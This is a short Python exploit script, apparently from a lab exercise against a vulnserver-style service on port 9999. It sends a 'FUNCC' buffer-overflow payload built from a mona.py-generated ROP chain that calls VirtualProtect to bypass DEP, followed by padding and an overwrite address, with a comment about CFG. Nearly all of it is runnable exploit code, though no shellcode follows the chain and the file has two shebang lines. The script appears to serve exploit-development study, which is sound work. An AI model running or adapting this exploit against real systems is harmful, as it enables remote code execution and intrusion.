#!/usr/bin/env python3

#! /bin/python3

import socket   # The module "socket" provides access to the BSD socket interface
import struct   # The module "struct" performs conversions between Python values and C structs represented as Python bytes objects.
import sys      # The module "sys" provides access to the runtime environment and allows us to gather information about it.

# Check that we have a target IP
if (len(sys.argv) < 2):
    print("This program requires one Command Line Argument. This should be the IPv4 address of the target machine")
    exit(1)

# Set Constants for later use
HOST = sys.argv[1]  # Extract target IP
PORT = 9999         # victim port

def create_rop_chain():
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x752ee831,  # POP ESI # RETN [ucrtbase.dll] ** REBASED ** ASLR 
      0x753a6164,  # ptr to &VirtualProtect() [IAT ucrtbase.dll] ** REBASED ** ASLR
      0x766f47e1,  # MOV ESI,DWORD PTR DS:[ESI] # ADD AL,0 # MOV EAX,C00000BB # RETN 0x1C [KERNELBASE.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ebp:---]
      0x76798172,  # POP EBP # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x62501129,  # & jmp esp [Essfun.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x752fd962,  # POP EAX # RETN [ucrtbase.dll] ** REBASED ** ASLR 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x75949824,  # NEG EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x752ab2d6,  # XCHG EAX,EBX # RETN [ucrtbase.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_edx:---]
      0x76756ce4,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x759253f7,  # NEG EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x7723a5ba,  # XCHG EAX,EDX # RETN [ntdll.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ecx:---]
      0x77110dcb,  # POP ECX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x7714a9d6,  # &Writable location [RPCRT4.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_edi:---]
      0x752f1b85,  # POP EDI # RETN [ucrtbase.dll] ** REBASED ** ASLR 
      0x75949826,  # RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_eax:---]
      0x7672be42,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x7660b6af,  # PUSHAD # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
    ]

    return b''.join(struct.pack('<I', _) for _ in rop_gadgets)

PAYLOAD = (
    b'FUNCC /.' +
    create_rop_chain() + 
    b'A' * (792 - len(create_rop_chain())) +
    struct.pack('<L', 0x00423C02) # This will need to be a function in a module with CFG enabled
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)